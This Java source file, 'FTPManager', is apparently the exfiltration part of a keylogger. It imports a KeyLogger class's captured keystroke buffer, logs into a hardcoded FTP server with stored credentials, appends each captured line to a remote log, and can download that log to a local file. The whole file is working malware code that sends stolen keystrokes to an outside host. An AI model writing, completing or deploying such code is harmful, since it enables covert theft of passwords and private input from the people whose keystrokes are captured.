package org.dot;
import static org.dot.Constants.LOGIN;
import static org.dot.Constants.LOG_LOCAL;
import static org.dot.Constants.LOG_REMOTE;
import static org.dot.Constants.PASSWORD;
import static org.dot.KeyLogger.LINE;

import java.io.BufferedOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileNotFoundException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.charset.Charset;
import java.nio.file.AccessDeniedException;
import java.nio.file.Files;
import java.nio.file.Paths;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;

public class FTPManager {

	public static FTPClient ftp = new FTPClient();
	
	private FTPManager() {}
	
	
	public static boolean connect() throws Exception {
		ftp.connect("dot.do.am");
		ftp.enterLocalPassiveMode();
		ftp.enterRemotePassiveMode();
		ftp.setCharset(Charset.forName("UTF-8"));
		return ftp.login(LOGIN, PASSWORD);
	}
	
	public static boolean upload() throws Exception {
		System.out.println("Writing line \"" + LINE + "\"");
		
		OutputStream out = ftp.appendFileStream(LOG_REMOTE);
		out.write(LINE.getBytes("UTF-8"));
		out.close();
		LINE = "";
		return ftp.completePendingCommand();
	}
	
	public static boolean download(String ... args) throws Exception {
		ByteArrayOutputStream bytes = new ByteArrayOutputStream();
		OutputStream out = new BufferedOutputStream(bytes);
		
		try {
			ftp.setFileType(FTP.BINARY_FILE_TYPE);
			boolean b = ftp.retrieveFile(LOG_REMOTE, out);
			bytes.close();
			out.close();
			String s = bytes.toString("UTF-8");
			PrintWriter pw;
			if (args.length > 0) {
				if (!Files.exists(Paths.get(args[0]))) {
					String path = "";
					String[] p = args[0].split("/");
					for (int i = 0; i < p.length - 1; i++) {
						path += p[i] + "/";
					}
					Files.createDirectories(Paths.get(path));
					Files.createFile(Paths.get(args[0]));
				}
				pw = new PrintWriter(args[0]);
			} else {
				pw = new PrintWriter(LOG_LOCAL);
			}
			pw.print(s);
			pw.close();
			return b;
		} catch (FileNotFoundException e) {
			System.out.println("File not found.");
		} catch (AccessDeniedException e) {
			System.out.println("Access denied.");
			e.printStackTrace();
		} catch (Exception e) {
			System.out.println("This exeption is not handled. Sorry.");
			e.printStackTrace();
		}
		finally {
			out.close();
		}
		return false;
	}
}
